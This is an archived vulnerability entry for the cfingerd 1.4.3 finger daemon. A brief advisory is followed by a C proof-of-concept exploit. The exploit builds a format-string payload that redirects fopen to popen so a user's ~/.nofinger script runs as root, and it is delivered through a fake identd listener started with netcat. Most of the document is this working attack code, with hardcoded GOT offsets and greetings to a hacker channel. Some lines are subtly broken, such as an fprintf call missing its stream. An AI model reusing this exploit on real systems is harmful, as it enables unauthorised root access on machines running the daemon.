source: http://www.securityfocus.com/bid/2914/info
 
cfingerd is a secure implementation of the finger daemon. cfingerd has been contributed to by many authors, and is maintained by the cfingerd development team.
 
A buffer overflow in cfingerd makes it possible for a local user to gain elevated privileges. Due to insufficient validation of input, a user can execute arbitrary code through the .nofinger file.
 
This makes it possible for a local user to gain elevated privileges, and potentially root access. 

/************************************************************

http://www.infodrom.ffis.de/projects/cfingerd/ states:

  Cfingerd is a free and secure finger daemon replacement for 
  standard finger daemons such as GNU fingerd or MIT fingerd.

April 11, 2001 Megyer Laszlo < abulla@freemail.hu > wrote:

  In 3 words: REMOTE ROOT VULNERABILITY


   idcf.c - July 11 2001 - happy 3 month anniversary!

   
   cfingerd 1.4.3 identd based localish exploit ;]
   no shellcode required if you have a local account
   make a script in ~/.nofinger that you want to be
   executed as root.

   it works by diverting the fopen call to popen. of 
   course it won't help if you don't already have a 
   local account but well, its just a proof of concept 
   and I think it's cute, and the more exploits there
   are against an unpatched system, the more likely (I
   hope) it will get patched. Would be nice if it worked
   that way anyway.
   
   ./idcf|nc -l -p 113 
   on a box you have root on, and finger you@otherhost
   to use.

   this is hardcoded for four letter names, but shouldn't
   require rocket science to make work for others.
   Hint:  offset and padding : format strings are fun.

   

                   M4D PR0PZ T0 :

           Steven for showing me da bugz
        noid 4 b3in6 7h3r3 wh3n no1 3153 w4z
        grue 4 lurking,  g00bER 4 something
     and the rest of #roothat @ irc.pulltheplug.com

       4150 70 mp3.com 4 http://mp3.com/cosv

***********************************************************/

// The offsets are from a version i compiled just to
// test the vulnerability and so will most likely not
// work for you.

// get this from objdump -R cfingered|grep fopen
#define OVER 0x0805532c
// get this from objdump -R cfingerd|grep popen
// and then gdb cfingerd  and x/x 0xoffset from objdump
#define WITH 0x080491ba

#include <stdio.h>
main(int argc,char*argv[])
{
 int z0=0,ovrw=OVER;    // address to overwrite with pass 1
 int z1=0,ovrw1=OVER+2; // address to overwrite with pass 2
 int slen=strlen("evil fingered from ")+9; 
 int addr=WITH;         // what to overwrite the address with
 int offset=20;         // where the first address is on the stack
 int a1,a2;             
 FILE *f;
 f=fopen("/etc/motd","w+");
 if(!f)
 { 
  fprintf("You must be root to use this exploit.\n");
  exit(1);
 }
 a1=(addr&0x000ffff)-slen;                 // 1st number of bytes
 a2=(0x10000+(addr>>16)-a1-slen)&0x0ffff;  // 2nd number of bytes
 printf(":::A%s%s",&ovrw,&ovrw1);          // header/padding/addresses
 printf("%%%ux%%%d$hn%%%ux%%%d$hn\n"       // formatstring itself
        ,a1,offset,a2,offset+1); 
 fprintf(stderr,"Visit http://mp3.com/cosv/ today!\n");
 fprintf(stderr,"And mebe visit your account on the other machine.\n");
 fprintf(stderr,"after you finger it.\n");
 fprintf(f,"Visit http://mp3.com/cosv/ today!\n");
 fclose(f);
 
}